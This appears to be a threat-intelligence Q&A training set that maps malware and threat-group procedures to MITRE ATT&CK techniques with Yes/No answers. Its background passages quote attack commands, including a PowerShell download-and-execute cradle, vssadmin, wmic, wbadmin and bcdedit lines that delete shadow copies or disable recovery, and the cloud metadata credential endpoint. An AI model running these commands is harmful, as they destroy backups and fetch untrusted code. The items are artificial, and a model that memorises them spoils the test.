[
  {
    "instruction": "Q: Is procedure CrackMapExec can enumerate the shared folders and associated permissions for a targeted network.  related to technique Process Injection.\n\nProvide your answer in Yes or No.",
    "context": "",
    "output": "No.\nThe provided context is related to Network Share Discovery",
    "category": "MitreFlan",
    "instruction_type": "mitre_yes_no_background_procedure",
    "parsed_raw_data": {
      "background": "Network Share Discovery: Adversaries may look for folders and drives shared on remote systems as a means of identifying sources of information to gather as a precursor for Collection and to identify potential systems of interest for Lateral Movement. Networks often contain shared network drives and folders that enable users to access file directories on various systems across a network. \n\nFile sharing over a Windows network occurs over the SMB protocol.   Net can be used to query a remote system for available shared drives using the <code>net view \\\\\\\\remotesystem</code> command. It can also be used to query shared drives on the local system using <code>net share</code>. For macOS, the <code>sharing -l</code> command lists all shared points used for smb services.",
      "question": "Is procedure CrackMapExec can enumerate the shared folders and associated permissions for a targeted network.  related to technique Process Injection",
      "yes/no": "No.\nThe provided context is related to Network Share Discovery",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_yes_no_background_procedure"
    }
  },
  {
    "instruction": "Answer in Yes or No.\n\nQuestion: Is procedure HyperBro can unpack and decrypt its payload prior to execution. a type of technique Deobfuscate/Decode Files or Information",
    "context": "",
    "output": "Yes",
    "category": "MitreFlan",
    "instruction_type": "mitre_yes_no_background_procedure",
    "parsed_raw_data": {
      "background": "Deobfuscate/Decode Files or Information: Adversaries may use Obfuscated Files or Information to hide artifacts of an intrusion from analysis. They may require separate mechanisms to decode or deobfuscate that information depending on how they intend to use it. Methods for doing that include built-in functionality of malware or by using utilities present on the system.\n\nOne such example is the use of certutil to decode a remote access tool portable executable file that has been hidden inside a certificate file. Another example is using the Windows <code>copy /b</code> command to reassemble binary fragments into a malicious payload.\n\nSometimes a user's action may be required to open it for deobfuscation or decryption as part of User Execution. The user may also be required to input a password to open a password protected compressed/encrypted file that was provided by the adversary.",
      "question": "Is procedure HyperBro can unpack and decrypt its payload prior to execution. a type of technique Deobfuscate/Decode Files or Information",
      "yes/no": "Yes",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_yes_no_background_procedure"
    }
  },
  {
    "instruction": "Q: Is procedure Mafalda can create a remote service, let it run once, and then delete it. a type of technique System Services: Service Execution.\n\nProvide your answer in Yes or No.",
    "context": "",
    "output": "Yes",
    "category": "MitreFlan",
    "instruction_type": "mitre_yes_no_background_procedure",
    "parsed_raw_data": {
      "background": "System Services: Service Execution: Adversaries may abuse the Windows service control manager to execute malicious commands or payloads. The Windows service control manager (<code>services.exe</code>) is an interface to manage and manipulate services. The service control manager is accessible to users via GUI components as well as system utilities such as <code>sc.exe</code> and Net.\n\nPsExec can also be used to execute commands or payloads via a temporary Windows service created through the service control manager API. Tools such as PsExec and <code>sc.exe</code> can accept remote servers as arguments and may be used to conduct remote execution.\n\nAdversaries may leverage these mechanisms to execute malicious content. This can be done by either executing a new or modified service. This technique is the execution used in conjunction with Windows Service during service persistence or privilege escalation.",
      "question": "Is procedure Mafalda can create a remote service, let it run once, and then delete it. a type of technique System Services: Service Execution",
      "yes/no": "Yes",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_yes_no_background_procedure"
    }
  },
  {
    "instruction": "Q: Is procedure Kazuar uses HTTP and HTTPS to communicate with the C2 server. Kazuar can also act as a webserver and listen for inbound HTTP requests through an exposed API. a type of technique Boot or Logon Autostart Execution: Shortcut Modification.\n\nProvide your answer in Yes or No.",
    "context": "",
    "output": "No.\nThe correct answer is Application Layer Protocol: Web Protocols",
    "category": "MitreFlan",
    "instruction_type": "mitre_yes_no_background_procedure",
    "parsed_raw_data": {
      "background": "Application Layer Protocol: Web Protocols: Adversaries may communicate using application layer protocols associated with web traffic to avoid detection/network filtering by blending in with existing traffic. Commands to the remote system, and often the results of those commands, will be embedded within the protocol traffic between the client and server. \n\nProtocols such as HTTP/S and WebSocket that carry web traffic may be very common in environments. HTTP/S packets have many fields and headers in which data can be concealed. An adversary may abuse these protocols to communicate with systems under their control within a victim network while also mimicking normal, expected traffic.",
      "question": "Is procedure Kazuar uses HTTP and HTTPS to communicate with the C2 server. Kazuar can also act as a webserver and listen for inbound HTTP requests through an exposed API. a type of technique Boot or Logon Autostart Execution: Shortcut Modification",
      "yes/no": "No.\nThe correct answer is Application Layer Protocol: Web Protocols",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_yes_no_background_procedure"
    }
  },
  {
    "instruction": "Background Ingress Tool Transfer: Adversaries may transfer tools or other files from an external system into a compromised environment. Tools or files may be copied from an external adversary-controlled system to the victim network through the command and control channel or through alternate protocols such as ftp. Once present, adversaries may also transfer/spread tools between victim devices within a compromised environment (i.e. Lateral Tool Transfer). \n\nOn Windows, adversaries may use various utilities to download tools, such as `copy`, `finger`, certutil, and PowerShell commands such as <code>IEX(New-Object Net.WebClient).downloadString()</code> and <code>Invoke-WebRequest</code>. On Linux and macOS systems, a variety of utilities also exist, such as `curl`, `scp`, `sftp`, `tftp`, `rsync`, `finger`, and `wget`.\n\nAdversaries may also abuse installers and package managers, such as `yum` or `winget`, to download tools to victim hosts. Adversaries have also abused file application features, such as the Windows `search-ms` protocol handler, to deliver malicious files to victims through remote file searches invoked by User Execution (typically after interacting with Phishing lures).\n\nFiles can also be transferred using various Web Services as well as native or otherwise present tools on the victim system. In some cases, adversaries may be able to leverage services that sync between a web-based and an on-premises client, such as Dropbox or OneDrive, to transfer files onto victim systems. For example, by compromising a cloud account and logging into the service's web portal, an adversary may be able to trigger an automatic syncing process that transfers the file onto the victim's machine..\nQ: Is procedure down_new has the ability to download files to the compromised host. a type of technique System Binary Proxy Execution: Mshta.\n\nProvide your answer in Yes or No.",
    "context": "",
    "output": "No.\nThe provided context is correlated with Ingress Tool Transfer",
    "category": "MitreFlan",
    "instruction_type": "mitre_yes_no_background_procedure",
    "parsed_raw_data": {
      "background": "Ingress Tool Transfer: Adversaries may transfer tools or other files from an external system into a compromised environment. Tools or files may be copied from an external adversary-controlled system to the victim network through the command and control channel or through alternate protocols such as ftp. Once present, adversaries may also transfer/spread tools between victim devices within a compromised environment (i.e. Lateral Tool Transfer). \n\nOn Windows, adversaries may use various utilities to download tools, such as `copy`, `finger`, certutil, and PowerShell commands such as <code>IEX(New-Object Net.WebClient).downloadString()</code> and <code>Invoke-WebRequest</code>. On Linux and macOS systems, a variety of utilities also exist, such as `curl`, `scp`, `sftp`, `tftp`, `rsync`, `finger`, and `wget`.\n\nAdversaries may also abuse installers and package managers, such as `yum` or `winget`, to download tools to victim hosts. Adversaries have also abused file application features, such as the Windows `search-ms` protocol handler, to deliver malicious files to victims through remote file searches invoked by User Execution (typically after interacting with Phishing lures).\n\nFiles can also be transferred using various Web Services as well as native or otherwise present tools on the victim system. In some cases, adversaries may be able to leverage services that sync between a web-based and an on-premises client, such as Dropbox or OneDrive, to transfer files onto victim systems. For example, by compromising a cloud account and logging into the service's web portal, an adversary may be able to trigger an automatic syncing process that transfers the file onto the victim's machine.",
      "question": "Is procedure down_new has the ability to download files to the compromised host. a type of technique System Binary Proxy Execution: Mshta",
      "yes/no": "No.\nThe provided context is correlated with Ingress Tool Transfer",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_yes_no_background_procedure"
    }
  },
  {
    "instruction": "Q: Is procedure AADInternals can enumerate information about a variety of cloud services, such as Office 365 and Sharepoint instances or OpenID Configurations.  related to technique Obfuscated Files or Information: Indicator Removal from Tools.\n\nProvide your answer in Yes or No.",
    "context": "",
    "output": "No.\nThe correct answer is Cloud Service Discovery",
    "category": "MitreFlan",
    "instruction_type": "mitre_yes_no_background_procedure",
    "parsed_raw_data": {
      "background": "Cloud Service Discovery: An adversary may attempt to enumerate the cloud services running on a system after gaining access. These methods can differ from platform-as-a-service (PaaS), to infrastructure-as-a-service (IaaS), or software-as-a-service (SaaS). Many services exist throughout the various cloud providers and can include Continuous Integration and Continuous Delivery (CI/CD), Lambda Functions, Azure AD, etc. They may also include security services, such as AWS GuardDuty and Microsoft Defender for Cloud, and logging services, such as AWS CloudTrail and Google Cloud Audit Logs.\n\nAdversaries may attempt to discover information about the services enabled throughout the environment. Azure tools and APIs, such as the Azure AD Graph API and Azure Resource Manager API, can enumerate resources and services, including applications, management groups, resources and policy definitions, and their relationships that are accessible by an identity.\n\nFor example, Stormspotter is an open source tool for enumerating and constructing a graph for Azure resources and services, and Pacu is an open source AWS exploitation framework that supports several methods for discovering cloud services.\n\nAdversaries may use the information gained to shape follow-on behaviors, such as targeting data or credentials from enumerated services or evading identified defenses through Disable or Modify Tools or Disable or Modify Cloud Logs.",
      "question": "Is procedure AADInternals can enumerate information about a variety of cloud services, such as Office 365 and Sharepoint instances or OpenID Configurations.  related to technique Obfuscated Files or Information: Indicator Removal from Tools",
      "yes/no": "No.\nThe correct answer is Cloud Service Discovery",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_yes_no_background_procedure"
    }
  },
  {
    "instruction": "Background Command and Scripting Interpreter: PowerShell: Adversaries may abuse PowerShell commands and scripts for execution. PowerShell is a powerful interactive command-line interface and scripting environment included in the Windows operating system. Adversaries can use PowerShell to perform a number of actions, including discovery of information and execution of code. Examples include the <code>Start-Process</code> cmdlet which can be used to run an executable and the <code>Invoke-Command</code> cmdlet which runs a command locally or on a remote computer (though administrator permissions are required to use PowerShell to connect to remote systems).\n\nPowerShell may also be used to download and run executables from the Internet, which can be executed from disk or in memory without touching disk.\n\nA number of PowerShell-based offensive testing tools are available, including Empire,  PowerSploit, PoshC2, and PSAttack.\n\nPowerShell commands/scripts can also be executed without directly invoking the <code>powershell.exe</code> binary through interfaces to PowerShell's underlying <code>System.Management.Automation</code> assembly DLL exposed through the .NET framework and Windows Common Language Interface (CLI)..\nAnswer in Yes or No.\n\nQuestion: Is procedure During Operation Dream Job, Lazarus Group used PowerShell commands to explore the environment of compromised victims.  related to technique Command and Scripting Interpreter: PowerShell",
    "context": "",
    "output": "Yes",
    "category": "MitreFlan",
    "instruction_type": "mitre_yes_no_background_procedure",
    "parsed_raw_data": {
      "background": "Command and Scripting Interpreter: PowerShell: Adversaries may abuse PowerShell commands and scripts for execution. PowerShell is a powerful interactive command-line interface and scripting environment included in the Windows operating system. Adversaries can use PowerShell to perform a number of actions, including discovery of information and execution of code. Examples include the <code>Start-Process</code> cmdlet which can be used to run an executable and the <code>Invoke-Command</code> cmdlet which runs a command locally or on a remote computer (though administrator permissions are required to use PowerShell to connect to remote systems).\n\nPowerShell may also be used to download and run executables from the Internet, which can be executed from disk or in memory without touching disk.\n\nA number of PowerShell-based offensive testing tools are available, including Empire,  PowerSploit, PoshC2, and PSAttack.\n\nPowerShell commands/scripts can also be executed without directly invoking the <code>powershell.exe</code> binary through interfaces to PowerShell's underlying <code>System.Management.Automation</code> assembly DLL exposed through the .NET framework and Windows Common Language Interface (CLI).",
      "question": "Is procedure During Operation Dream Job, Lazarus Group used PowerShell commands to explore the environment of compromised victims.  related to technique Command and Scripting Interpreter: PowerShell",
      "yes/no": "Yes",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_yes_no_background_procedure"
    }
  },
  {
    "instruction": "Q: Is procedure ChChes can encrypt C2 traffic with AES or RC4. a type of technique Encrypted Channel: Symmetric Cryptography.\n\nProvide your answer in Yes or No.",
    "context": "",
    "output": "Yes",
    "category": "MitreFlan",
    "instruction_type": "mitre_yes_no_background_procedure",
    "parsed_raw_data": {
      "background": "Encrypted Channel: Symmetric Cryptography: Adversaries may employ a known symmetric encryption algorithm to conceal command and control traffic rather than relying on any inherent protections provided by a communication protocol. Symmetric encryption algorithms use the same key for plaintext encryption and ciphertext decryption. Common symmetric encryption algorithms include AES, DES, 3DES, Blowfish, and RC4.",
      "question": "Is procedure ChChes can encrypt C2 traffic with AES or RC4. a type of technique Encrypted Channel: Symmetric Cryptography",
      "yes/no": "Yes",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_yes_no_background_procedure"
    }
  },
  {
    "instruction": "Background Command and Scripting Interpreter: Adversaries may abuse command and script interpreters to execute commands, scripts, or binaries. These interfaces and languages provide ways of interacting with computer systems and are a common feature across many different platforms. Most systems come with some built-in command-line interface and scripting capabilities, for example, macOS and Linux distributions include some flavor of Unix Shell while Windows installations include the Windows Command Shell and PowerShell.\n\nThere are also cross-platform interpreters such as Python, as well as those commonly associated with client applications such as JavaScript and Visual Basic.\n\nAdversaries may abuse these technologies in various ways as a means of executing arbitrary commands. Commands and scripts can be embedded in Initial Access payloads delivered to victims as lure documents or as secondary payloads downloaded from an existing C2. Adversaries may also execute commands through interactive terminals/shells, as well as utilize various Remote Services in order to achieve remote Execution..\nQ: Is procedure Windigo has used a Perl script for information gathering.  related to technique Browser Session Hijacking.\n\nProvide your answer in Yes or No.",
    "context": "",
    "output": "No.\nThe provided context is correlated with Command and Scripting Interpreter",
    "category": "MitreFlan",
    "instruction_type": "mitre_yes_no_background_procedure",
    "parsed_raw_data": {
      "background": "Command and Scripting Interpreter: Adversaries may abuse command and script interpreters to execute commands, scripts, or binaries. These interfaces and languages provide ways of interacting with computer systems and are a common feature across many different platforms. Most systems come with some built-in command-line interface and scripting capabilities, for example, macOS and Linux distributions include some flavor of Unix Shell while Windows installations include the Windows Command Shell and PowerShell.\n\nThere are also cross-platform interpreters such as Python, as well as those commonly associated with client applications such as JavaScript and Visual Basic.\n\nAdversaries may abuse these technologies in various ways as a means of executing arbitrary commands. Commands and scripts can be embedded in Initial Access payloads delivered to victims as lure documents or as secondary payloads downloaded from an existing C2. Adversaries may also execute commands through interactive terminals/shells, as well as utilize various Remote Services in order to achieve remote Execution.",
      "question": "Is procedure Windigo has used a Perl script for information gathering.  related to technique Browser Session Hijacking",
      "yes/no": "No.\nThe provided context is correlated with Command and Scripting Interpreter",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_yes_no_background_procedure"
    }
  },
  {
    "instruction": "Answer in Yes or No.\n\nQuestion: Is procedure Sliver can inject code into local and remote processes. a type of technique Screen Capture",
    "context": "",
    "output": "No",
    "category": "MitreFlan",
    "instruction_type": "mitre_yes_no_background_procedure",
    "parsed_raw_data": {
      "background": "Process Injection: Adversaries may inject code into processes in order to evade process-based defenses as well as possibly elevate privileges. Process injection is a method of executing arbitrary code in the address space of a separate live process. Running code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via process injection may also evade detection from security products since the execution is masked under a legitimate process. \n\nThere are many different ways to inject code into a process, many of which abuse legitimate functionalities. These implementations exist for every major OS but are typically platform specific. \n\nMore sophisticated samples may perform multiple process injections to segment modules and further evade detection, utilizing named pipes or other inter-process communication (IPC) mechanisms as a communication channel.",
      "question": "Is procedure Sliver can inject code into local and remote processes. a type of technique Screen Capture",
      "yes/no": "No",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_yes_no_background_procedure"
    }
  },
  {
    "instruction": "Answer in Yes or No.\n\nQuestion: Is procedure MoustachedBouncer has used plugins to save captured screenshots to `.\\AActdata\\` on an SMB share.  related to technique Application Layer Protocol: DNS",
    "context": "",
    "output": "No.\nThe correct answer is Data Staged: Remote Data Staging",
    "category": "MitreFlan",
    "instruction_type": "mitre_yes_no_background_procedure",
    "parsed_raw_data": {
      "background": "Data Staged: Remote Data Staging: Adversaries may stage data collected from multiple systems in a central location or directory on one system prior to Exfiltration. Data may be kept in separate files or combined into one file through techniques such as Archive Collected Data. Interactive command shells may be used, and common functionality within cmd and bash may be used to copy data into a staging location.\n\nIn cloud environments, adversaries may stage data within a particular instance or virtual machine before exfiltration. An adversary may Create Cloud Instance and stage data in that instance.\n\nBy staging data on one system prior to Exfiltration, adversaries can minimize the number of connections made to their C2 server and better evade detection.",
      "question": "Is procedure MoustachedBouncer has used plugins to save captured screenshots to `.\\AActdata\\` on an SMB share.  related to technique Application Layer Protocol: DNS",
      "yes/no": "No.\nThe correct answer is Data Staged: Remote Data Staging",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_yes_no_background_procedure"
    }
  },
  {
    "instruction": "Background Data Encoding: Standard Encoding: Adversaries may encode data with a standard data encoding system to make the content of command and control traffic more difficult to detect. Command and control (C2) information can be encoded using a standard data encoding system that adheres to existing protocol specifications. Common data encoding schemes include ASCII, Unicode, hexadecimal, Base64, and MIME. Some data encoding systems may also result in data compression, such as gzip..\nAnswer in Yes or No.\n\nQuestion: Is procedure HOPLIGHT has utilized Zlib compression to obfuscate the communications payload.  related to technique Data Encoding: Standard Encoding",
    "context": "",
    "output": "Yes",
    "category": "MitreFlan",
    "instruction_type": "mitre_yes_no_background_procedure",
    "parsed_raw_data": {
      "background": "Data Encoding: Standard Encoding: Adversaries may encode data with a standard data encoding system to make the content of command and control traffic more difficult to detect. Command and control (C2) information can be encoded using a standard data encoding system that adheres to existing protocol specifications. Common data encoding schemes include ASCII, Unicode, hexadecimal, Base64, and MIME. Some data encoding systems may also result in data compression, such as gzip.",
      "question": "Is procedure HOPLIGHT has utilized Zlib compression to obfuscate the communications payload.  related to technique Data Encoding: Standard Encoding",
      "yes/no": "Yes",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_yes_no_background_procedure"
    }
  },
  {
    "instruction": "Q: Is procedure Peirates can query the query AWS and GCP metadata APIs for secrets. a type of technique Unsecured Credentials: Cloud Instance Metadata API.\n\nProvide your answer in Yes or No.",
    "context": "",
    "output": "Yes",
    "category": "MitreFlan",
    "instruction_type": "mitre_yes_no_background_procedure",
    "parsed_raw_data": {
      "background": "Unsecured Credentials: Cloud Instance Metadata API: Adversaries may attempt to access the Cloud Instance Metadata API to collect credentials and other sensitive data.\n\nMost cloud service providers support a Cloud Instance Metadata API which is a service provided to running virtual instances that allows applications to access information about the running virtual instance. Available information generally includes name, security group, and additional metadata including sensitive data such as credentials and UserData scripts that may contain additional secrets. The Instance Metadata API is provided as a convenience to assist in managing applications and is accessible by anyone who can access the instance. A cloud metadata API has been used in at least one high profile compromise.\n\nIf adversaries have a presence on the running virtual instance, they may query the Instance Metadata API directly to identify credentials that grant access to additional resources. Additionally, adversaries may exploit a Server-Side Request Forgery (SSRF) vulnerability in a public facing web proxy that allows them to gain access to the sensitive information via a request to the Instance Metadata API.\n\nThe de facto standard across cloud service providers is to host the Instance Metadata API at <code>http://169.254.169.254</code>.",
      "question": "Is procedure Peirates can query the query AWS and GCP metadata APIs for secrets. a type of technique Unsecured Credentials: Cloud Instance Metadata API",
      "yes/no": "Yes",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_yes_no_background_procedure"
    }
  },
  {
    "instruction": "Q: Is procedure FIN8 has distributed targeted emails containing links to malicious documents with embedded macros. a type of technique Command and Scripting Interpreter: Unix Shell.\n\nProvide your answer in Yes or No.",
    "context": "",
    "output": "No",
    "category": "MitreFlan",
    "instruction_type": "mitre_yes_no_background_procedure",
    "parsed_raw_data": {
      "background": "Phishing: Spearphishing Link: Adversaries may send spearphishing emails with a malicious link in an attempt to gain access to victim systems. Spearphishing with a link is a specific variant of spearphishing. It is different from other forms of spearphishing in that it employs the use of links to download malware contained in email, instead of attaching malicious files to the email itself, to avoid defenses that may inspect email attachments. Spearphishing may also involve social engineering techniques, such as posing as a trusted source.\n\nAll forms of spearphishing are electronically delivered social engineering targeted at a specific individual, company, or industry. In this case, the malicious emails contain links. Generally, the links will be accompanied by social engineering text and require the user to actively click or copy and paste a URL into a browser, leveraging User Execution. The visited website may compromise the web browser using an exploit, or the user will be prompted to download applications, documents, zip files, or even executables depending on the pretext for the email in the first place.\n\nAdversaries may also include links that are intended to interact directly with an email reader, including embedded images intended to exploit the end system directly. Additionally, adversaries may use seemingly benign links that abuse special characters to mimic legitimate websites (known as an \"IDN homograph attack\"). URLs may also be obfuscated by taking advantage of quirks in the URL schema, such as the acceptance of integer- or hexadecimal-based hostname formats and the automatic discarding of text before an \u201c@\u201d symbol: for example, `hxxp://google.com@1157586937`.\n\nAdversaries may also utilize links to perform consent phishing, typically with OAuth 2.0 request URLs that when accepted by the user provide permissions/access for malicious applications, allowing adversaries to  Steal Application Access Tokens. These stolen access tokens allow the adversary to perform various actions on behalf of the user via API calls. \n\nAdversaries may also utilize spearphishing links to Steal Application Access Tokens that grant immediate access to the victim environment. For example, a user may be lured through \u201cconsent phishing\u201d into granting adversaries permissions/access via a malicious OAuth 2.0 request URL .\n\nSimilarly, malicious links may also target device-based authorization, such as OAuth 2.0 device authorization grant flow which is typically used to authenticate devices without UIs/browsers. Known as \u201cdevice code phishing,\u201d an adversary may send a link that directs the victim to a malicious authorization page where the user is tricked into entering a code/credentials that produces a device token.",
      "question": "Is procedure FIN8 has distributed targeted emails containing links to malicious documents with embedded macros. a type of technique Command and Scripting Interpreter: Unix Shell",
      "yes/no": "No",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_yes_no_background_procedure"
    }
  },
  {
    "instruction": "Q: Is procedure During Operation Wocao, threat actors used PowerSploit's `Invoke-Kerberoast` module to request encrypted service tickets and bruteforce the passwords of Windows service accounts offline. a type of technique Dynamic Resolution: Fast Flux DNS.\n\nProvide your answer in Yes or No.",
    "context": "",
    "output": "No.\nThe correct answer is Steal or Forge Kerberos Tickets: Kerberoasting",
    "category": "MitreFlan",
    "instruction_type": "mitre_yes_no_background_procedure",
    "parsed_raw_data": {
      "background": "Steal or Forge Kerberos Tickets: Kerberoasting: Adversaries may abuse a valid Kerberos ticket-granting ticket (TGT) or sniff network traffic to obtain a ticket-granting service (TGS) ticket that may be vulnerable to Brute Force. \n\nService principal names (SPNs) are used to uniquely identify each instance of a Windows service. To enable authentication, Kerberos requires that SPNs be associated with at least one service logon account (an account specifically tasked with running a service).\n\nAdversaries possessing a valid Kerberos ticket-granting ticket (TGT) may request one or more Kerberos ticket-granting service (TGS) service tickets for any SPN from a domain controller (DC). Portions of these tickets may be encrypted with the RC4 algorithm, meaning the Kerberos 5 TGS-REP etype 23 hash of the service account associated with the SPN is used as the private key and is thus vulnerable to offline Brute Force attacks that may expose plaintext credentials. \n\nThis same behavior could be executed using service tickets captured from network traffic.\n\nCracked hashes may enable Persistence, Privilege Escalation, and Lateral Movement via access to Valid Accounts.",
      "question": "Is procedure During Operation Wocao, threat actors used PowerSploit's `Invoke-Kerberoast` module to request encrypted service tickets and bruteforce the passwords of Windows service accounts offline. a type of technique Dynamic Resolution: Fast Flux DNS",
      "yes/no": "No.\nThe correct answer is Steal or Forge Kerberos Tickets: Kerberoasting",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_yes_no_background_procedure"
    }
  },
  {
    "instruction": "Q: Is procedure FIVEHANDS has the ability to delete volume shadow copies on compromised hosts.  related to technique Inhibit System Recovery.\n\nProvide your answer in Yes or No.",
    "context": "",
    "output": "Yes",
    "category": "MitreFlan",
    "instruction_type": "mitre_yes_no_background_procedure",
    "parsed_raw_data": {
      "background": "Inhibit System Recovery: Adversaries may delete or remove built-in data and turn off services designed to aid in the recovery of a corrupted system to prevent recovery. This may deny access to available backups and recovery options.\n\nOperating systems may contain features that can help fix corrupted systems, such as a backup catalog, volume shadow copies, and automatic repair features. Adversaries may disable or delete system recovery features to augment the effects of Data Destruction and Data Encrypted for Impact. Furthermore, adversaries may disable recovery notifications, then corrupt backups.\n\nA number of native Windows utilities have been used by adversaries to disable or delete system recovery features:\n\n* <code>vssadmin.exe</code> can be used to delete all volume shadow copies on a system - <code>vssadmin.exe delete shadows /all /quiet</code>\n* Windows Management Instrumentation can be used to delete volume shadow copies - <code>wmic shadowcopy delete</code>\n* <code>wbadmin.exe</code> can be used to delete the Windows Backup Catalog - <code>wbadmin.exe delete catalog -quiet</code>\n* <code>bcdedit.exe</code> can be used to disable automatic Windows recovery features by modifying boot configuration data - <code>bcdedit.exe /set {default} bootstatuspolicy ignoreallfailures & bcdedit /set {default} recoveryenabled no</code>\n* <code>REAgentC.exe</code> can be used to disable Windows Recovery Environment (WinRE) repair/recovery options of an infected system\n* <code>diskshadow.exe</code> can be used to delete all volume shadow copies on a system - <code>diskshadow delete shadows all</code>  \n\nOn network devices, adversaries may leverage Disk Wipe to delete backup firmware images and reformat the file system, then System Shutdown/Reboot to reload the device. Together this activity may leave network devices completely inoperable and inhibit recovery operations.\n\nAdversaries may also delete \u201conline\u201d backups that are connected to their network \u2013 whether via network storage media or through folders that sync to cloud services. In cloud environments, adversaries may disable versioning and backup policies and delete snapshots, machine images, and prior versions of objects designed to be used in disaster recovery scenarios.",
      "question": "Is procedure FIVEHANDS has the ability to delete volume shadow copies on compromised hosts.  related to technique Inhibit System Recovery",
      "yes/no": "Yes",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_yes_no_background_procedure"
    }
  },
  {
    "instruction": "Background Trusted Relationship: Adversaries may breach or otherwise leverage organizations who have access to intended victims. Access through trusted third party relationship abuses an existing connection that may not be protected or receives less scrutiny than standard mechanisms of gaining access to a network.\n\nOrganizations often grant elevated access to second or third-party external providers in order to allow them to manage internal systems as well as cloud-based environments. Some examples of these relationships include IT services contractors, managed security providers, infrastructure contractors (e.g. HVAC, elevators, physical security). The third-party provider's access may be intended to be limited to the infrastructure being maintained, but may exist on the same network as the rest of the enterprise. As such, Valid Accounts used by the other party for access to internal network systems may be compromised and used.\n\nIn Office 365 environments, organizations may grant Microsoft partners or resellers delegated administrator permissions. By compromising a partner or reseller account, an adversary may be able to leverage existing delegated administrator relationships or send new delegated administrator offers to clients in order to gain administrative control over the victim tenant..\nQ: Is procedure During the SolarWinds Compromise, APT29 gained access through compromised accounts at cloud solution partners, and used compromised certificates issued by Mimecast to authenticate to Mimecast customer systems.  related to technique Trusted Relationship.\n\nProvide your answer in Yes or No.",
    "context": "",
    "output": "Yes",
    "category": "MitreFlan",
    "instruction_type": "mitre_yes_no_background_procedure",
    "parsed_raw_data": {
      "background": "Trusted Relationship: Adversaries may breach or otherwise leverage organizations who have access to intended victims. Access through trusted third party relationship abuses an existing connection that may not be protected or receives less scrutiny than standard mechanisms of gaining access to a network.\n\nOrganizations often grant elevated access to second or third-party external providers in order to allow them to manage internal systems as well as cloud-based environments. Some examples of these relationships include IT services contractors, managed security providers, infrastructure contractors (e.g. HVAC, elevators, physical security). The third-party provider's access may be intended to be limited to the infrastructure being maintained, but may exist on the same network as the rest of the enterprise. As such, Valid Accounts used by the other party for access to internal network systems may be compromised and used.\n\nIn Office 365 environments, organizations may grant Microsoft partners or resellers delegated administrator permissions. By compromising a partner or reseller account, an adversary may be able to leverage existing delegated administrator relationships or send new delegated administrator offers to clients in order to gain administrative control over the victim tenant.",
      "question": "Is procedure During the SolarWinds Compromise, APT29 gained access through compromised accounts at cloud solution partners, and used compromised certificates issued by Mimecast to authenticate to Mimecast customer systems.  related to technique Trusted Relationship",
      "yes/no": "Yes",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_yes_no_background_procedure"
    }
  },
  {
    "instruction": "Answer in Yes or No.\n\nQuestion: Is procedure LoudMiner used a batch script to run the Linux virtual machine as a service. a type of technique Screen Capture",
    "context": "",
    "output": "No.\nThe provided context is related to Command and Scripting Interpreter: Windows Command Shell",
    "category": "MitreFlan",
    "instruction_type": "mitre_yes_no_background_procedure",
    "parsed_raw_data": {
      "background": "Command and Scripting Interpreter: Windows Command Shell: Adversaries may abuse the Windows command shell for execution. The Windows command shell (cmd) is the primary command prompt on Windows systems. The Windows command prompt can be used to control almost any aspect of a system, with various permission levels required for different subsets of commands. The command prompt can be invoked remotely via Remote Services such as SSH.\n\nBatch files (ex: .bat or .cmd) also provide the shell with a list of sequential commands to run, as well as normal scripting operations such as conditionals and loops. Common uses of batch files include long or repetitive tasks, or the need to run the same set of commands on multiple systems.\n\nAdversaries may leverage cmd to execute various commands and payloads. Common uses include cmd to execute a single command, or abusing cmd interactively with input and output forwarded over a command and control channel.",
      "question": "Is procedure LoudMiner used a batch script to run the Linux virtual machine as a service. a type of technique Screen Capture",
      "yes/no": "No.\nThe provided context is related to Command and Scripting Interpreter: Windows Command Shell",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_yes_no_background_procedure"
    }
  },
  {
    "instruction": "Q: Is procedure Mis-Type network traffic can communicate over HTTP. a type of technique Application Layer Protocol: Web Protocols.\n\nProvide your answer in Yes or No.",
    "context": "",
    "output": "Yes",
    "category": "MitreFlan",
    "instruction_type": "mitre_yes_no_background_procedure",
    "parsed_raw_data": {
      "background": "Application Layer Protocol: Web Protocols: Adversaries may communicate using application layer protocols associated with web traffic to avoid detection/network filtering by blending in with existing traffic. Commands to the remote system, and often the results of those commands, will be embedded within the protocol traffic between the client and server. \n\nProtocols such as HTTP/S and WebSocket that carry web traffic may be very common in environments. HTTP/S packets have many fields and headers in which data can be concealed. An adversary may abuse these protocols to communicate with systems under their control within a victim network while also mimicking normal, expected traffic.",
      "question": "Is procedure Mis-Type network traffic can communicate over HTTP. a type of technique Application Layer Protocol: Web Protocols",
      "yes/no": "Yes",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_yes_no_background_procedure"
    }
  },
  {
    "instruction": "Q: Is procedure MoleNet can achieve persitence on the infected machine by setting the Registry run key. a type of technique Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder.\n\nProvide your answer in Yes or No.",
    "context": "",
    "output": "Yes",
    "category": "MitreFlan",
    "instruction_type": "mitre_yes_no_background_procedure",
    "parsed_raw_data": {
